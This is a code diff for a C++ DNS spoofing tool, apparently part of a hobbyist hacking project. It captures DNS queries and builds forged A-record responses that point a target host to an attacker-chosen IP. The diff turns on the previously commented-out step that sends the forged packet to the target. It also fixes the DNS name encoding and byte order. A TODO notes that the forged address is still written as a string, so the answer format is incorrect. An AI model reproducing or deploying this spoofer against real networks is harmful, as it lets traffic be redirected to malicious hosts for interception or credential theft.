@@ -53,11 +53,11 @@ int CHaks::DNSSpoofer::Spoof(int socketFd, const char* interfaceName, char* targ
                             packet.Print();
 
                             PacketCraft::Packet dnsResponse;
-                            CreateFakeDNSResponse(socketFd, interfaceName, packet, dnsResponse, fakeDomainIP, dnsParser.questionsArray[i]);
+                            CreateFakeDNSResponse(packet, dnsResponse, fakeDomainIP, dnsParser.questionsArray[i]);
                             std::cout << "fake response created:\n";
                             dnsResponse.Print();
 
-                            /*
+                    
                             sockaddr_in dst{};
                             inet_pton(AF_INET, targetIP, &dst.sin_addr);
 
@@ -66,7 +66,6 @@ int CHaks::DNSSpoofer::Spoof(int socketFd, const char* interfaceName, char* targ
                                 LOG_ERROR(APPLICATION_ERROR, "PacketCraft::Packet::Send() error");
                                 return APPLICATION_ERROR;
                             }
-                            */
                         }
                     }
                 }
@@ -87,8 +86,8 @@ int CHaks::DNSSpoofer::Spoof(int socketFd, const char* interfaceName, char* targ
     }
 }
 
-int CHaks::DNSSpoofer::CreateFakeDNSResponse(int socketFd, const char* interfaceName, PacketCraft::Packet& dnsRequestPacket,
-    PacketCraft::Packet& dnsResponsePacket, char* fakeDomainIP, const PacketCraft::DNSQuestion& question)
+int CHaks::DNSSpoofer::CreateFakeDNSResponse(PacketCraft::Packet& dnsRequestPacket, PacketCraft::Packet& dnsResponsePacket, 
+    char* fakeDomainIP, const PacketCraft::DNSQuestion& question)
 {
     EthHeader* dnsRequestEthHeader = (EthHeader*)dnsRequestPacket.FindLayerByType(PC_ETHER_II);
     dnsResponsePacket.AddLayer(PC_ETHER_II, ETH_HLEN);
@@ -116,6 +115,9 @@ int CHaks::DNSSpoofer::CreateFakeDNSResponse(int socketFd, const char* interface
             DNSHeader* dnsRequestDNSHeader = (DNSHeader*)dnsRequestPacket.FindLayerByType(PC_DNS);
             uint32_t dnsQuestionSize = PacketCraft::GetStrLen(question.qName) + 4; // 4 is the size of a dns question minus qName 
             uint32_t dnsAnswerSize = PacketCraft::GetStrLen(question.qName) + PacketCraft::GetStrLen(fakeDomainIP) + 10; // 10 is the size of a dns answer minus aName and rData(fakeDomainIP)
+            std::cout << "dnsQuestionSize is " << dnsQuestionSize << "\n";
+            std::cout << "dnsAnswerSize is " << dnsAnswerSize << "\n";
+            
             dnsResponsePacket.AddLayer(PC_DNS, sizeof(DNSHeader) + dnsQuestionSize + dnsAnswerSize);
             DNSHeader* dnsResponseDNSHeader = (DNSHeader*)dnsResponsePacket.GetLayerStart(3);
             CreateDNSHeader(*dnsResponseDNSHeader, *dnsRequestDNSHeader, question, fakeDomainIP);
@@ -198,22 +200,38 @@ int CHaks::DNSSpoofer::CreateDNSHeader(DNSHeader& dnsResponseDNSHeader, const DN
     dnsResponseDNSHeader.nscount = htons(0);
     dnsResponseDNSHeader.adcount = htons(0);
 
-    // copy question to the dns response
+    uint16_t qTypeInNetworkByteOrder = htons(question.qType);
+    uint16_t qClassInNetworkByteOrder = htons(question.qClass);
+    char qNameInDNSFormat[FQDN_MAX_STR_LEN]{};
+    if(PacketCraft::DomainToDNSName(question.qName, qNameInDNSFormat) == APPLICATION_ERROR)
+    {
+        LOG_ERROR(APPLICATION_ERROR, "PacketCraft::DomainToDNSName() error");
+        return APPLICATION_ERROR;
+    }
+
+    // adding +1 because the last label length is 0. Apparantly it gets treated as a null terminating character, but we need it included
+    uint32_t qNameLen = PacketCraft::GetStrLen(qNameInDNSFormat) + 1;
+    
+    /*
+    std::cout << "qName: " << question.qName << "\n";
+    std::cout << "qNameInDNSFormat: " << qNameInDNSFormat << "\n";
+    std::cout << "qNameLen: " << qNameLen << "\n";
+    std::cout << "qTypeInNetworkByteOrder: " << qTypeInNetworkByteOrder << " qType host order: " << ntohs(qTypeInNetworkByteOrder) << "\n";
+    std::cout << "qClassInNetworkByteOrder: " << qClassInNetworkByteOrder << " qClass host order: " << ntohs(qClassInNetworkByteOrder) << "\n";
+    */
+
+    // copy question to the dns response packet
     uint8_t* dnsResponseDataPtr = dnsResponseDNSHeader.querySection;
-    memcpy(dnsResponseDataPtr, question.qName, PacketCraft::GetStrLen(question.qName));
-    dnsResponseDataPtr += PacketCraft::GetStrLen(question.qName);
-    memset(dnsResponseDataPtr, 0, 1);
-    ++dnsResponseDataPtr;
-    memcpy(dnsResponseDataPtr, &question.qType, sizeof(question.qType));
-    dnsResponseDataPtr += sizeof(question.qType);
-    memcpy(dnsResponseDataPtr, &question.qClass, sizeof(question.qClass));
-    dnsResponseDataPtr += sizeof(question.qClass);
+    memcpy(dnsResponseDataPtr, qNameInDNSFormat, qNameLen);
+    dnsResponseDataPtr += qNameLen;
+    memcpy(dnsResponseDataPtr, &qTypeInNetworkByteOrder, sizeof(qTypeInNetworkByteOrder));
+    dnsResponseDataPtr += sizeof(qTypeInNetworkByteOrder);
+    memcpy(dnsResponseDataPtr, &qClassInNetworkByteOrder, sizeof(qClassInNetworkByteOrder));
+    dnsResponseDataPtr += sizeof(qClassInNetworkByteOrder); // ptr now points to the start of the answer
 
     // create answer
-    memcpy(dnsResponseDataPtr, question.qName, PacketCraft::GetStrLen(question.qName)); // name is the same as in the request
-    dnsResponseDataPtr += PacketCraft::GetStrLen(question.qName); 
-    memset(dnsResponseDataPtr, 0, 1); // 0 indicates the end of the name
-    ++dnsResponseDataPtr;
+    memcpy(dnsResponseDataPtr, qNameInDNSFormat, qNameLen);
+    dnsResponseDataPtr += qNameLen;
     *((uint16_t*)dnsResponseDataPtr) = htons(1); // type is A record
     dnsResponseDataPtr += 2;
     *((uint16_t*)dnsResponseDataPtr) = htons(1); // class is IN
@@ -223,6 +241,8 @@ int CHaks::DNSSpoofer::CreateDNSHeader(DNSHeader& dnsResponseDNSHeader, const DN
     *((uint16_t*)dnsResponseDataPtr) = htons(PacketCraft::GetStrLen(fakeDomainIP)); // rdLength
     dnsResponseDataPtr += 2;
     memcpy(dnsResponseDataPtr, fakeDomainIP, PacketCraft::GetStrLen(fakeDomainIP) + 1);
+    // TODO: what is the format of rData? Right we just put the address in as string format, but should it 
+    // be put as 32bit ints?
 
     return NO_ERROR;
 }
